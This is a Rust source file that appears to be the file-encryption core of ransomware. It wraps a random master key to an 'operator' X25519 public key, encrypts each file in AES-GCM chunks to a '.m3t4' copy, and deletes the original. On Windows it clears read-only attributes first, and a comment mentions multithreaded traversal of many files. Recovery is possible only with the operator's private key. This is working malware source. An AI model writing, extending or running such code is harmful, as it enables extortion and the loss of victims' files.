use std::fs::{self, File};
use std::io::{self, BufReader, BufWriter, Read, Write};
use std::path::{Path, PathBuf};

use aes_gcm::aead::{AeadInPlace, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use hkdf::Hkdf;
use rand::rngs::OsRng;
use rand::RngCore;
use sha2::Sha256;
use x25519_dalek::{PublicKey, StaticSecret};

pub const MAGIC: &[u8; 4] = b"M3T4";
pub const EXT: &str = ".m3t4";
pub const LEGACY_EXT: &str = ".r4080";
const VERSION: u8 = 3;
const CHUNK: usize = 1024 * 1024;
const KEY_INFO: &[u8] = b"r4080-file-v3";
const WRAP_INFO: &[u8] = b"r4080-master-wrap-v1";
const WRAP_SALT: &[u8] = b"r4080-wrap-salt-v1";

pub struct WrappedMasterKey {
    pub ephemeral_public: [u8; 32],
    pub nonce: [u8; 12],
    pub ciphertext: [u8; 48],
}

pub fn b64_encode(bytes: &[u8]) -> String {
    B64.encode(bytes)
}

pub fn epk_b64(w: &WrappedMasterKey) -> String {
    b64_encode(&w.ephemeral_public)
}

pub fn nonce_b64(w: &WrappedMasterKey) -> String {
    b64_encode(&w.nonce)
}

pub fn data_b64(w: &WrappedMasterKey) -> String {
    b64_encode(&w.ciphertext)
}

pub fn wrapped_from_b64(epk: &str, nonce: &str, data: &str) -> Result<WrappedMasterKey, String> {
    let epk = B64
        .decode(epk.trim())
        .map_err(|_| "bad epk base64".to_string())?;
    let nonce = B64
        .decode(nonce.trim())
        .map_err(|_| "bad nonce base64".to_string())?;
    let data = B64
        .decode(data.trim())
        .map_err(|_| "bad data base64".to_string())?;
    if epk.len() != 32 || nonce.len() != 12 || data.len() != 48 {
        return Err("bad wrapped-key lengths".to_string());
    }
    let mut wrapped = WrappedMasterKey {
        ephemeral_public: [0u8; 32],
        nonce: [0u8; 12],
        ciphertext: [0u8; 48],
    };
    wrapped.ephemeral_public.copy_from_slice(&epk);
    wrapped.nonce.copy_from_slice(&nonce);
    wrapped.ciphertext.copy_from_slice(&data);
    Ok(wrapped)
}

pub fn generate_master() -> [u8; 32] {
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);
    key
}

fn wrap_key(shared: &[u8]) -> [u8; 32] {
    let hk = Hkdf::<Sha256>::new(Some(WRAP_SALT), shared);
    let mut okm = [0u8; 32];
    hk.expand(WRAP_INFO, &mut okm).expect("hkdf size");
    okm
}

pub fn wrap_master(operator_public: &[u8; 32], master: &[u8; 32]) -> WrappedMasterKey {
    let mut secret_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut secret_bytes);
    let secret = StaticSecret::from(secret_bytes);
    let ephemeral_public = PublicKey::from(&secret);
    let shared = secret.diffie_hellman(&PublicKey::from(*operator_public));
    let key = wrap_key(shared.as_bytes());

    let mut nonce = [0u8; 12];
    OsRng.fill_bytes(&mut nonce);
    let cipher = Aes256Gcm::new_from_slice(&key).expect("aes key");
    let mut buf = *master;
    let tag = cipher
        .encrypt_in_place_detached(Nonce::from_slice(&nonce), b"", &mut buf)
        .expect("wrap");

    let mut ciphertext = [0u8; 48];
    ciphertext[..32].copy_from_slice(&buf);
    ciphertext[32..].copy_from_slice(tag.as_slice());
    WrappedMasterKey {
        ephemeral_public: ephemeral_public.to_bytes(),
        nonce,
        ciphertext,
    }
}

pub fn unwrap_master(
    operator_private: &[u8; 32],
    wrapped: &WrappedMasterKey,
) -> Result<[u8; 32], String> {
    let secret = StaticSecret::from(*operator_private);
    let shared = secret.diffie_hellman(&PublicKey::from(wrapped.ephemeral_public));
    let key = wrap_key(shared.as_bytes());
    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| "bad wrap key".to_string())?;

    let mut buf = [0u8; 32];
    buf.copy_from_slice(&wrapped.ciphertext[..32]);
    let tag = aes_gcm::Tag::from_slice(&wrapped.ciphertext[32..]);
    cipher
        .decrypt_in_place_detached(Nonce::from_slice(&wrapped.nonce), b"", &mut buf, tag)
        .map_err(|_| "key unwrap failed".to_string())?;
    Ok(buf)
}

fn file_key(master: &[u8; 32], salt: &[u8; 16]) -> [u8; 32] {
    let hk = Hkdf::<Sha256>::new(Some(salt), master);
    let mut okm = [0u8; 32];
    hk.expand(KEY_INFO, &mut okm).expect("hkdf size");
    okm
}

fn chunk_nonce(base: &[u8; 12], counter: u64) -> [u8; 12] {
    let mut nonce = *base;
    nonce[4..].copy_from_slice(&counter.to_be_bytes());
    nonce
}

pub fn wipe(buf: &mut [u8]) {
    for byte in buf {
        unsafe { std::ptr::write_volatile(byte, 0) };
    }
}

pub fn append(path: &Path, suffix: &str) -> PathBuf {
    let mut raw = path.as_os_str().to_os_string();
    raw.push(suffix);
    PathBuf::from(raw)
}

fn aead_err() -> io::Error {
    io::Error::new(io::ErrorKind::Other, "aead init failed")
}

pub fn encrypt_file(master: &[u8; 32], src: &Path) -> io::Result<Option<u64>> {
    let dst = append(src, EXT);
    if dst.exists() {
        return Ok(None);
    }
    // Unique tmp per attempt: two threads can never collide on the same
    // staging path even if traversal hands them the same source twice.
    let tmp = append(&dst, &format!(".{}.tmp", OsRng.next_u64()));
    match encrypt_file_inner(master, src, &dst, &tmp) {
        Ok(n) => Ok(n),
        Err(e) => {
            let _ = fs::remove_file(&tmp);
            Err(e)
        }
    }
}

fn encrypt_file_inner(
    master: &[u8; 32],
    src: &Path,
    dst: &Path,
    tmp: &Path,
) -> io::Result<Option<u64>> {
    if dst.exists() {
        return Ok(None);
    }

    clear_readonly(src);

    let mut salt = [0u8; 16];
    let mut base_nonce = [0u8; 12];
    OsRng.fill_bytes(&mut salt);
    OsRng.fill_bytes(&mut base_nonce);
    let mut key = file_key(master, &salt);

    let mut reader = BufReader::with_capacity(CHUNK, File::open(src)?);
    let mut writer = BufWriter::with_capacity(CHUNK, File::create(&tmp)?);

    let name = src
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let name_bytes = name.as_bytes();
    let name_len = name_bytes.len().min(u16::MAX as usize) as u16;

    writer.write_all(MAGIC)?;
    writer.write_all(&[VERSION])?;
    writer.write_all(&salt)?;
    writer.write_all(&base_nonce)?;
    writer.write_all(&(CHUNK as u32).to_be_bytes())?;
    writer.write_all(&name_len.to_be_bytes())?;
    writer.write_all(&name_bytes[..name_len as usize])?;

    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| aead_err())?;
    let mut buf = vec![0u8; CHUNK];
    let mut counter = 0u64;
    let mut total = 0u64;

    loop {
        let n = reader.read(&mut buf)?;
        if n == 0 {
            break;
        }
        let nonce = chunk_nonce(&base_nonce, counter);
        let plain = &mut buf[..n];
        let tag = cipher
            .encrypt_in_place_detached(Nonce::from_slice(&nonce), b"", plain)
            .map_err(|_| io::Error::new(io::ErrorKind::Other, "aead encrypt failed"))?;
        writer.write_all(&((n + 16) as u32).to_be_bytes())?;
        writer.write_all(plain)?;
        writer.write_all(tag.as_slice())?;
        counter += 1;
        total += n as u64;
    }

    writer.write_all(&u32::MAX.to_be_bytes())?;
    writer.flush()?;
    let file = writer.into_inner().map_err(|e| e.into_error())?;
    file.sync_all()?;
    drop(file);

    fs::rename(&tmp, &dst)?;
    fs::remove_file(src)?;
    wipe(&mut key);
    Ok(Some(total))
}

pub fn decrypt_file(master: &[u8; 32], src: &Path) -> io::Result<u64> {
    let out = decrypt_file_inner(master, src);
    if out.is_err() {
        let _ = fs::remove_file(append(
            &strip_ext(src).unwrap_or_else(|_| src.to_path_buf()),
            ".dec",
        ));
    }
    out
}

fn decrypt_file_inner(master: &[u8; 32], src: &Path) -> io::Result<u64> {
    let parent = src.parent().unwrap_or_else(|| Path::new("."));
    let mut reader = BufReader::with_capacity(CHUNK, File::open(src)?);

    let mut magic = [0u8; 4];
    reader.read_exact(&mut magic)?;
    if &magic != MAGIC {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "missing M3T4 magic",
        ));
    }
    let mut version = [0u8; 1];
    reader.read_exact(&mut version)?;
    if version[0] < 2 || version[0] > VERSION {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "unsupported version",
        ));
    }
    let mut salt = [0u8; 16];
    reader.read_exact(&mut salt)?;
    let mut base_nonce = [0u8; 12];
    reader.read_exact(&mut base_nonce)?;
    let mut chunk_size = [0u8; 4];
    reader.read_exact(&mut chunk_size)?;
    let _ = u32::from_be_bytes(chunk_size);
    let mut name_len = [0u8; 2];
    reader.read_exact(&mut name_len)?;
    let name_len = u16::from_be_bytes(name_len) as usize;
    let mut name_bytes = vec![0u8; name_len];
    reader.read_exact(&mut name_bytes)?;
    let original_name = String::from_utf8_lossy(&name_bytes).into_owned();

    let out = if original_name.is_empty() {
        strip_ext(src)?
    } else {
        parent.join(&original_name)
    };
    let tmp = append(&out, ".dec");
    let _ = fs::remove_file(&tmp);

    let mut key = file_key(master, &salt);
    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| aead_err())?;
    let mut writer = BufWriter::with_capacity(CHUNK, File::create(&tmp)?);
    let mut counter = 0u64;
    let mut total = 0u64;

    loop {
        let mut len_raw = [0u8; 4];
        reader.read_exact(&mut len_raw)?;
        let len = u32::from_be_bytes(len_raw);
        if len == u32::MAX {
            break;
        }
        if (len as usize) < 16 {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "short chunk"));
        }
        let mut chunk = vec![0u8; len as usize];
        reader.read_exact(&mut chunk)?;
        let tag_start = chunk.len() - 16;
        let mut tag_bytes = [0u8; 16];
        tag_bytes.copy_from_slice(&chunk[tag_start..]);
        let tag = aes_gcm::Tag::from_slice(&tag_bytes);
        let nonce = chunk_nonce(&base_nonce, counter);
        let plain = &mut chunk[..tag_start];
        cipher
            .decrypt_in_place_detached(Nonce::from_slice(&nonce), b"", plain, tag)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "tag mismatch"))?;
        writer.write_all(plain)?;
        total += plain.len() as u64;
        counter += 1;
    }

    writer.flush()?;
    let file = writer.into_inner().map_err(|e| e.into_error())?;
    file.sync_all()?;
    drop(file);

    if out.exists() {
        let _ = fs::remove_file(&out);
    }
    fs::rename(&tmp, &out)?;
    fs::remove_file(src)?;
    wipe(&mut key);
    Ok(total)
}

fn strip_ext(path: &Path) -> io::Result<PathBuf> {
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "bad file name"))?;
    let base = name
        .strip_suffix(EXT)
        .or_else(|| name.strip_suffix(LEGACY_EXT))
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "not .m3t4"))?;
    Ok(path.with_file_name(base))
}

#[cfg(windows)]
fn clear_readonly(path: &Path) {
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Storage::FileSystem::SetFileAttributesW;
    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
    unsafe {
        SetFileAttributesW(wide.as_ptr(), FILE_ATTRIBUTE_NORMAL);
    }
}

#[cfg(not(windows))]
fn clear_readonly(_path: &Path) {}
